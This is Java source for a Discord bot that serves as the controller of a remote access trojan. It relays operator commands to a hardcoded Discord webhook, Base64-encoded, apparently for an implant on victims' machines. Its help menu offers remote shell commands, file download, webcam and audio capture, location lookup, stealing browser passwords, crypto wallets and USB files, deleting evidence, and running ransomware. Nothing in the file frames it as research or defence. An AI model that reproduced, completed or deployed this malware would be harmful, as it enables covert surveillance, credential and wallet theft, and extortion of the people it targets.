import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.cache.CacheFlag;

import javax.security.auth.login.LoginException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class DiscordBot extends ListenerAdapter {

    private static final String TOKEN = System.getenv("DISCORD_TOKEN");
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1542458066157572188/1O-xPE2tJ2l8rCyomB8khGM3c7XsnOp3pnpF6sNQljo4_hanKRFZdiN8jRA9aiJ5a6Dj";

    public static void main(String[] args) throws LoginException, InterruptedException {
        if (TOKEN == null || TOKEN.isEmpty()) {
            System.err.println("❌ ERROR: DISCORD_TOKEN environment variable not set!");
            System.exit(1);
        }

        System.out.println("=".repeat(50));
        System.out.println("🤖 Starting Discord Bot...");
        System.out.println("=".repeat(50));

        JDA jda = JDABuilder.createDefault(TOKEN)
                .enableIntents(GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MESSAGES)
                .enableCache(CacheFlag.MEMBER_OVERRIDES)
                .addEventListeners(new DiscordBot())
                .build();

        jda.awaitReady();

        System.out.println("✅ Bot Online!");
        System.out.println("📌 Name: " + jda.getSelfUser().getName());
        System.out.println("=".repeat(50));

        jda.getPresence().setActivity(
            net.dv8tion.jda.api.entities.Activity.playing("!help | 1818")
        );
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) return;
        String message = event.getMessage().getContentRaw();

        if (message.equalsIgnoreCase("!ping")) {
            event.getChannel().sendMessage("🏓 Pong! " + event.getJDA().getGatewayPing() + "ms").queue();
        }
        else if (message.equalsIgnoreCase("!help")) {
            String help = """
                    📋 **Commands:**
                    `!screenshot` - Take screenshot
                    `!lock` - Lock screen
                    `!unlock` - Unlock screen
                    `!cmd <command>` - Run CMD
                    `!ls <path>` - List files
                    `!download <path>` - Download file
                    `!delete_evidence` - Delete all evidence
                    `!webcam` - Capture webcam
                    `!record` - Record audio
                    `!map` - Show location
                    `!usb` - Steal USB files
                    `!browser` - Steal passwords
                    `!crypto` - Steal crypto wallets
                    `!ransom` - Ransomware simulation
                    🔑 **Password:** `1818`
                    """;
            event.getChannel().sendMessage(help).queue();
        }
        else if (message.startsWith("!msg ")) {
            String msg = message.substring(5);
            sendCommand("msg", msg);
            event.getChannel().sendMessage("📨 Sending message...").queue();
        }
        else if (message.equalsIgnoreCase("!screenshot")) {
            sendCommand("screenshot", "");
            event.getChannel().sendMessage("📸 Taking screenshot...").queue();
        }
        else if (message.equalsIgnoreCase("!lock")) {
            sendCommand("lock", "");
            event.getChannel().sendMessage("🔒 Locking screen...").queue();
        }
        else if (message.equalsIgnoreCase("!unlock")) {
            sendCommand("unlock", "");
            event.getChannel().sendMessage("🔓 Unlocking...").queue();
        }
        else if (message.equalsIgnoreCase("!delete_evidence")) {
            sendCommand("delete_evidence", "");
            event.getChannel().sendMessage("🧹 Deleting evidence...").queue();
        }
        else if (message.startsWith("!cmd ")) {
            String cmd = message.substring(5);
            sendCommand("cmd", cmd);
            event.getChannel().sendMessage("💻 Running: `" + cmd + "`").queue();
        }
        else if (message.startsWith("!ls ")) {
            String path = message.substring(4);
            sendCommand("ls", path);
            event.getChannel().sendMessage("📂 Listing: `" + path + "`").queue();
        }
        else if (message.startsWith("!download ")) {
            String path = message.substring(10);
            sendCommand("download", path);
            event.getChannel().sendMessage("📥 Downloading: `" + path + "`").queue();
        }
        else if (message.equalsIgnoreCase("!webcam")) {
            sendCommand("webcam", "");
            event.getChannel().sendMessage("📷 Capturing webcam...").queue();
        }
        else if (message.equalsIgnoreCase("!record")) {
            sendCommand("record", "");
            event.getChannel().sendMessage("🎤 Recording audio...").queue();
        }
        else if (message.equalsIgnoreCase("!map")) {
            sendCommand("map", "");
            event.getChannel().sendMessage("🗺️ Getting location...").queue();
        }
        else if (message.equalsIgnoreCase("!usb")) {
            sendCommand("usb", "");
            event.getChannel().sendMessage("💾 Stealing USB files...").queue();
        }
        else if (message.equalsIgnoreCase("!browser")) {
            sendCommand("browser", "");
            event.getChannel().sendMessage("🔑 Stealing passwords...").queue();
        }
        else if (message.equalsIgnoreCase("!crypto")) {
            sendCommand("crypto", "");
            event.getChannel().sendMessage("💰 Stealing crypto wallets...").queue();
        }
        else if (message.equalsIgnoreCase("!ransom")) {
            sendCommand("ransom", "");
            event.getChannel().sendMessage("🔴 Running ransomware...").queue();
        }
    }

    private void sendCommand(String command, String parameter) {
        try {
            String encoded = Base64.getEncoder().encodeToString(parameter.getBytes(StandardCharsets.UTF_8));
            String payload = String.format("{\"content\": \"```\\n[COMMAND]\\n%s\\n%s\\n```\"}", command, encoded);
            
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.getBytes(StandardCharsets.UTF_8));
            }
            
            System.out.println("📤 Sent " + command + " → " + conn.getResponseCode());
            conn.disconnect();
        } catch (Exception e) {
            System.err.println("❌ Error: " + e.getMessage());
        }
    }
}